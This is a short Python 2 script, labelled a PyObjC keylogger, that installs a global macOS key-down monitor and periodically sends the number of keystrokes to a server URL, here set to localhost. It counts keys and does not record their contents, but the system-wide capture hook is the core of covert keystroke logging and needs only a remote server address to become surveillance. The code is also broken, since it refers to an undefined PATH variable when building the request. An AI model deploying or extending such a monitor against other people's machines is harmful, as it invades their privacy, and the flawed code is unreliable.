#!/usr/bin/python2.6

"""PyObjC keylogger for Python
by  ljos https://github.com/ljos
"""
    
from Cocoa import NSApplication, NSApp, NSEvent, NSKeyDownMask
from Foundation import NSObject, NSLog
from PyObjCTools import AppHelper
import time
import urllib2

#
# configuration (constants)
#
INTERVAL = 1.64 # seconds
SERVER = 'http://localhost:8888'
PARAM = 'keycount'

#
# globals
#
start = time.time()
counter = 0

class AppDelegate(NSObject):
    def applicationDidFinishLaunching_(self, aNotification):
        print 'loaded'
        NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(NSKeyDownMask, handler)

def handler(event):
    global start
    global counter
    counter += 1
    print 'counted'
    end = time.time()
    final = end - start

    if final >= INTERVAL:
        #
        # compose our server URL using the parts above and our counter value
        #
        url = SERVER + '/' + PATH + '?' + PARAM + '=' + str(counter)   
        print '>', url 

        #
        # try sending the request and catch any possible errors (there's others potentially)
        #
        try:
            urllib2.urlopen(url)
        except urllib2.URLError, err:
            print 'Request failed', err.reason

        #
        # reset counter & time basis
        #
        counter = 0
        start = time.time()
    

def main(): 
    app = NSApplication.sharedApplication()
    delegate = AppDelegate.alloc().init()
    NSApp().setDelegate_(delegate)
    print 'loading'
    AppHelper.runEventLoop()
    
    
if __name__ == '__main__':
    main()
    
    
    